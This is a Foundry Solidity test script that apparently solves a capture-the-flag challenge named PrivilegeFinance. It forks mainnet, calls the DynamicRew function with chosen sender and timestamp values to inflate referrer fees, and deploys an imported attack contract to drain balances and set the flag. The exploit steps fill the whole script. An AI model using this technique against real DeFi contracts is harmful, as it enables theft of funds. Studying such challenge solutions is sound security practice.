// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./PrivilegeFinanceAttack.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    PrivilegeFinance pf;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);

        pf = new PrivilegeFinance();

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", pf.isSolved());
        vm.stopPrank();
    }

    function solve() public {
        address msgsender = 0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053;
        uint256 blocktimestamp = 1677729609;
        pf.DynamicRew(msgsender, blocktimestamp, 10000000, 50);
        console2.log("ReferrerFess:", pf.ReferrerFees());
    
        PrivilegeFinanceAttack attack = new PrivilegeFinanceAttack();
        attack.attack(address(pf));
        console2.log("Attacker contract's referrer:", pf.referrers(address(attack)));
        console2.log("Attacker balance:", pf.balances(attacker));
        
        pf.setflag();
    }
}




